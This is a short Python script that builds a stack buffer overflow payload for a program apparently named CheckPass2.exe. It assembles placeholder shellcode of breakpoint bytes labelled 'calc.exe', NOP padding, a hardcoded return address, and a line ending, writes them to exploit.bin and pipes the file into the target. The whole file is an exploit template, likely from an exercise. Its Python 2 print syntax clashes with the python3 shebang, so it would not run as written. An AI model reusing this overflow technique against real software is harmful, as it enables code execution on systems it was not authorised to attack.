#!/usr/bin/python3 -V
# coding: Shift_JIS
import sys
import struct
import os

#calc.exe
shellcode = "\xcc" * 30

dummy = "\x90" * (116 - len(shellcode))

retAddr =int("0x0019FAD8", 16)

buf = shellcode + dummy + struct.pack('<I', retAddr) + "\x0d\x0a"

f = open("exploit.bin","wb")
f.write(buf)
f.close()

print "len(shellcode) = {0} ".format(len(shellcode))
os.system("CheckPass2.exe < exploit.bin")	
